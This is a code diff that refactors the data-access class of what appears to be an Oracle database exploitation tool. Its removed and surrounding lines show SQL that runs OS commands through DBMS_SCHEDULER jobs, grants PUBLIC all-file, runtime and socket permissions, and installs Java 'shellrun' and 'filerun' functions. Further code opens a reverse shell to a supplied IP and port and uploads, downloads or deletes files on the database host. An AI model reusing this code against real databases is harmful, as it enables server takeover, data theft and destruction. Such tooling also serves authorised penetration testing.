@@ -3,7 +3,7 @@ package Dao;
 import Controller.OracleController;
 import Entity.ControllersFactory;
 import Util.MessageUtil;
-import Util.OracleCodeUtils;
+import Util.OracleSqlUtil;
 import Util.Utils;
 import Util.YamlConfigs;
 import javafx.application.Platform;
@@ -139,13 +139,13 @@ public class OracleDao {
      */
     public void getVersion(){
         try {
-            String selectfile = "select * from v$version";
+            String selectfile = OracleSqlUtil.getVersionSql;
             String version = executeSql(selectfile);
             //不等于 -1 就是找到了windows关键字
-            if(version.toString().toLowerCase().indexOf("windows") != -1){
+            if(version.toLowerCase().contains("windows")){
                 OS = "windows";
             }
-            oracleController.oracleLogTextArea.appendText(Utils.log("当前数据库版本:" + version));
+            oracleController.oracleLogTextArea.appendText(Utils.log("当前数据库版本:\n" + version));
         }catch (Exception e){
             Platform.runLater(() ->{
                 MessageUtil.showExceptionMessage(e,e.getMessage());
@@ -158,7 +158,7 @@ public class OracleDao {
      */
     public void isDBA() {
         try {
-            String sqlstring = "select userenv('ISDBA') from dual";
+            String sqlstring = OracleSqlUtil.isDBASql;
             String dbares = executeSql(sqlstring);
             if("TRUE".equals(dbares.replace("\n",""))){
                 oracleController.oracleLogTextArea.appendText(Utils.log("当前账号是 DBA 权限"));
@@ -193,9 +193,9 @@ public class OracleDao {
 //                cmds[0] = "C:\\Windows\\System32\\cmd.exe";
 //            }
             String randomJobName = "JOB_"+Utils.getRandomString().toUpperCase(Locale.ROOT);
-            String CREATE_JOBSql = "BEGIN DBMS_SCHEDULER.create_job(job_name=>'%s',job_type=>'EXECUTABLE',number_of_arguments=>%s,job_action =>'%s');END;";
-            String SET_JOB_ARGUMENT_VALUESql = "BEGIN DBMS_SCHEDULER.set_job_argument_value('%s',%s,'%s');END;";
-            String ENABLESql = "BEGIN DBMS_SCHEDULER.enable('%s');END;";
+            String CREATE_JOBSql = OracleSqlUtil.CREATE_JOBSql;
+            String SET_JOB_ARGUMENT_VALUESql = OracleSqlUtil.SET_JOB_ARGUMENT_VALUESql;
+            String ENABLESql = OracleSqlUtil.ENABLESql;
             // 拼接
             CREATE_JOBSql = String.format(CREATE_JOBSql,randomJobName,cmds.length - 1,cmds[0]);
             executeSql(CREATE_JOBSql);
@@ -226,16 +226,16 @@ public class OracleDao {
      */
     public void deleteJob(String jobname,String force,String defer) {
         try {
-            String checkSql = String.format("select job_name from dba_scheduler_jobs where job_name='%s'",jobname);
+            String checkSql = String.format(OracleSqlUtil.checkJobSql,jobname);
             String realJobName = executeSql(checkSql).replace("\n","");
             if("".equals(realJobName)){
                 oracleController.oracleLogTextArea.appendText(Utils.log(jobname +" 任务不存在！"));
                 return;
             }
-            String sql = "begin DBMS_SCHEDULER.drop_job('\"%s\"', %s, %s);end;";
+            String sql = OracleSqlUtil.deleteJobSql;
             sql = String.format(sql,jobname,force,defer);
             executeSql(sql);
-            oracleController.oracleLogTextArea.appendText(Utils.log(jobname +" 任务删除成！"));
+            oracleController.oracleLogTextArea.appendText(Utils.log(jobname +" 任务删除成功！"));
         }catch (Exception e){
             Platform.runLater(() ->{
                 MessageUtil.showExceptionMessage(e,e.getMessage());
@@ -252,7 +252,7 @@ public class OracleDao {
     public void getJobStatus(String jobname) throws SQLException, InterruptedException {
         // 延时 10s 之后才获取任务状态
         Thread.sleep(5000);
-        String sql = String.format("SELECT status, additional_info FROM USER_SCHEDULER_JOB_RUN_DETAILS WHERE job_name = '%s'",jobname);
+        String sql = String.format(OracleSqlUtil.getJobStatusSql,jobname);
         String additional_info = "";
         String status = "";
         // 使用Connection来创建一个Statement对象
@@ -274,6 +274,7 @@ public class OracleDao {
                 oracleController.Textarea_OracleCommandResult.setText(additional_info);
             }else if("".equals(status)){
                 oracleController.oracleLogTextArea.appendText(Utils.log(jobname + " 任务正在进行..."));
+                //getJobStatus(jobname);
             }else {
                 oracleController.oracleLogTextArea.appendText(Utils.log(jobname + " 任务执行完成！"));
             }
@@ -285,15 +286,20 @@ public class OracleDao {
      */
     public void importShellUtilJAVA(){
         try {
-            String CREATE_SOURCE = "DECLARE v_command VARCHAR2(32767);BEGIN v_command :='create or replace and compile java source named \"ShellUtil\" as %s';EXECUTE IMMEDIATE v_command;END;";
-            String GRANT_JAVA_EXEC = "begin dbms_java.grant_permission( 'PUBLIC', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'read,write,execute,delete' );end;";
+            String CREATE_SOURCE = OracleSqlUtil.ShellUtilCREATE_SOURCESql;
+            String GRANT_JAVA_EXEC = OracleSqlUtil.ShellUtilGRANT_JAVA_EXECSql;
             // 赋予命令执行权限
-            String GRANT_JAVA_EXEC2 = "begin dbms_java.grant_permission('PUBLIC','SYS:java.lang.RuntimePermission', '*', '');end;";
+            String GRANT_JAVA_EXEC2 = OracleSqlUtil.ShellUtilGRANT_JAVA_EXEC2Sql;
             // 赋予网络连接允许权限
             // 参考 https://docs.oracle.com/javase/8/docs/technotes/guides/security/spec/security-spec.doc3.html
-            String GRANT_JAVA_EXEC3 = "begin dbms_java.grant_permission('PUBLIC','SYS:java.net.SocketPermission', '*', 'accept, connect, listen, resolve');end;";
-            String CREATE_FUNCTION = "create or replace function shellrun(methodName varchar2,params varchar2,encoding varchar2) return varchar2 as language java name 'ShellUtil.run(java.lang.String,java.lang.String,java.lang.String) return java.lang.String';";
-            CREATE_SOURCE = String.format(CREATE_SOURCE, OracleCodeUtils.SHELLUTILSOURCE);
+            String GRANT_JAVA_EXEC3 = OracleSqlUtil.ShellUtilGRANT_JAVA_EXEC3Sql;
+            String CREATE_FUNCTION = OracleSqlUtil.ShellUtilCREATE_FUNCTIONSql;
+
+            // 获取插件目录
+            String path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Oracle" + File.separator + "ShellUtil.java";
+            // 读取插件内容
+            String SHELLUTILSOURCE = Utils.readFile(path);
+            CREATE_SOURCE = String.format(CREATE_SOURCE, SHELLUTILSOURCE);
             executeSql(CREATE_SOURCE);
             oracleController.oracleLogTextArea.appendText(Utils.log("导入 JAVA 代码成功！"));
             executeSql(GRANT_JAVA_EXEC);
@@ -314,14 +320,18 @@ public class OracleDao {
      */
     public void importFileUtilJAVA(){
         try {
-            String CREATE_SOURCE = "DECLARE v_command VARCHAR2(32767);BEGIN v_command :='create or replace and compile java source named \"FileUtil\" as %s';EXECUTE IMMEDIATE v_command;END;";
-            String GRANT_JAVA_EXEC = "begin dbms_java.grant_permission( 'PUBLIC', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'read,write,execute,delete' );end;";
+            String CREATE_SOURCE = OracleSqlUtil.FileUtilCREATE_SOURCESql;
+            String GRANT_JAVA_EXEC = OracleSqlUtil.FileUtilGRANT_JAVA_EXECSql;
             // 赋予文件操作属性权限
             // 参考 https://docs.oracle.com/javase/8/docs/technotes/guides/security/spec/security-spec.doc3.html
-            String GRANT_JAVA_EXEC1 = "begin dbms_java.grant_permission('PUBLIC', 'SYS:java.util.PropertyPermission', '*', 'read,write,execute,delete' );end;";
-            String CREATE_FUNCTION = "create or replace function filerun(methodName varchar2,params varchar2,encoding" +
-                    " varchar2) return varchar2 as language java name 'FileUtil.run(java.lang.String,java.lang.String,java.lang.String) return java.lang.String';";
-            CREATE_SOURCE = String.format(CREATE_SOURCE, OracleCodeUtils.FILEUTILSOURCE);
+            String GRANT_JAVA_EXEC1 = OracleSqlUtil.FileUtilGRANT_JAVA_EXEC1Sql;
+            String CREATE_FUNCTION = OracleSqlUtil.FileUtilCREATE_FUNCTIONSql;
+            // 获取插件目录
+            String path =
+                    Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Oracle" + File.separator + "FileUtil.java";
+            // 读取插件内容
+            String FILEUTILSOURCE = Utils.readFile(path);
+            CREATE_SOURCE = String.format(CREATE_SOURCE, FILEUTILSOURCE);
             executeSql(CREATE_SOURCE);
             oracleController.oracleLogTextArea.appendText(Utils.log("导入 JAVA 代码成功！"));
             executeSql(GRANT_JAVA_EXEC);
@@ -349,7 +359,7 @@ public class OracleDao {
         try {
             switch (type){
                 case "java":
-                    String cmdSqlString = "select shellrun('exec','%s','%s') from dual";
+                    String cmdSqlString = OracleSqlUtil.shellRunSql;
                     res = executeSql(String.format(cmdSqlString,command,code));
                     oracleController.oracleLogTextArea.appendText(Utils.log("执行命令成功！"));
                     break;
@@ -362,9 +372,9 @@ public class OracleDao {
         }catch (Exception e){
             oracleController.oracleLogTextArea.appendText(Utils.log("执行命令失败！"));
             String r = e.getMessage();
-            if(r.indexOf("ORA-00904") != -1){
+            if(r.contains("ORA-00904")){
                 oracleController.oracleLogTextArea.appendText(Utils.log("请先初始化方法！"));
-            }else if(r.indexOf("ORA-27486") != -1){
+            }else if(r.contains("ORA-27486")){
                 oracleController.oracleLogTextArea.appendText(Utils.log("当前账号权限不足！无法执行！"));
             } else {
                 Platform.runLater(() ->{
@@ -381,9 +391,9 @@ public class OracleDao {
     public void deleteShellFunction(){
         String res = "";
         try {
-            String checkSql = "select object_name from all_objects where object_name like '%SHELLRUN'";
-            String dropJAVASql = "DROP JAVA SOURCE \"ShellUtil\"";
-            String dropFuncSql = "drop function SHELLRUN";
+            String checkSql = OracleSqlUtil.checkShellFunctionSql;
+            String dropJAVASql = OracleSqlUtil.deleteShellJAVASOURCESql;
+            String dropFuncSql = OracleSqlUtil.deleteShellFunctionSql;
             res = executeSql(checkSql).replace("\n","");
             // 不等于空就说明存在 shellrun 函数
             if(!"".equals(res)){
@@ -391,7 +401,7 @@ public class OracleDao {
                 executeSql(dropJAVASql);
                 oracleController.oracleLogTextArea.appendText(Utils.log("删除 SHELLRUN 函数成功！"));
             }else {
-                oracleController.oracleLogTextArea.appendText(Utils.log("删除 SHELLRUN 函数失败！"));
+                oracleController.oracleLogTextArea.appendText(Utils.log("删除 SHELLRUN 函数失败！函数可能不存在！"));
             }
         }catch (Exception e){
             Platform.runLater(() ->{
@@ -406,9 +416,9 @@ public class OracleDao {
     public void deleteFileFunction(){
         String res = "";
         try {
-            String checkSql = "select object_name from all_objects where object_name like '%FILERUN'";
-            String dropJAVASql = "DROP JAVA SOURCE \"FileUtil\"";
-            String dropFuncSql = "drop function FILERUN";
+            String checkSql = OracleSqlUtil.checkFileFunctionSql;
+            String dropJAVASql = OracleSqlUtil.deleteFileJAVASOURCESql;
+            String dropFuncSql = OracleSqlUtil.deleteFileFunctionSql;
             res = executeSql(checkSql).replace("\n","");
             // 不等于空就说明存在 shellrun 函数
             if(!"".equals(res)){
@@ -431,13 +441,13 @@ public class OracleDao {
      * @param port
      */
     public void reverseJavaShell(String ip,String port){
-        String sqlstring1 = "select object_name from all_objects where object_name like '%SHELLRUN%' ";
+        String sqlstring1 = OracleSqlUtil.checkReverseJavaShellSql;
         try {
             String res1 = executeSql(sqlstring1).replace("\n","");
             if("".equals(res1)){
                 oracleController.oracleLogTextArea.appendText(Utils.log("SHELLRUN 函数不存在！，请先创建函数！"));
             }else {
-                executeSql(String.format("select shellrun('connectback','%s^%s','') from dual",ip,port));
+                executeSql(String.format(OracleSqlUtil.reverseJavaShellSql,ip,port));
                 oracleController.oracleLogTextArea.appendText(Utils.log("反弹 Shell 成功！"));
             }
         } catch (Exception e) {
@@ -455,7 +465,7 @@ public class OracleDao {
     public ArrayList<String> getDisk(){
         String tempres = "";
         ArrayList<String> res = new ArrayList<String>();
-        String sql = "select filerun('listdiver','','') from dual";
+        String sql = OracleSqlUtil.getDiskSql;
         try {
             tempres = executeSql(sql);
             res = splitDisk(tempres);
@@ -480,7 +490,7 @@ public class OracleDao {
             code = "UTF-8";
         }
         String tempres = "";
-        String sql = String.format("select filerun('listfile','%s','%s') from dual",path,code);
+        String sql = String.format(OracleSqlUtil.getFilesSql,path,code);
         try {
             tempres = executeSql(sql);
             res = splitFiles(tempres);
@@ -498,7 +508,7 @@ public class OracleDao {
      * @param contexts
      */
     public void upload(String path,String contexts){
-        String sql = "select filerun('writefile','%s^%s','') from dual";
+        String sql = OracleSqlUtil.uploadSql;
         try {
             sql = String.format(sql,path,contexts);
             String res = executeSql(sql);
@@ -523,7 +533,7 @@ public class OracleDao {
      * @return
      */
     public String download(String path){
-        String sql = "select filerun('readfile','%s','') from dual";
+        String sql = OracleSqlUtil.downloadSql;
         String res = "";
         try {
             sql = String.format(sql,path);
@@ -542,7 +552,7 @@ public class OracleDao {
      * @return
      */
     public String delete(String path){
-        String sql = "select filerun('deletefile','%s','') from dual";
+        String sql = OracleSqlUtil.deleteSql;
         String res = "";
         try {
             sql = String.format(sql,path);
@@ -554,6 +564,4 @@ public class OracleDao {
         }
         return res;
     }
-
-
 }
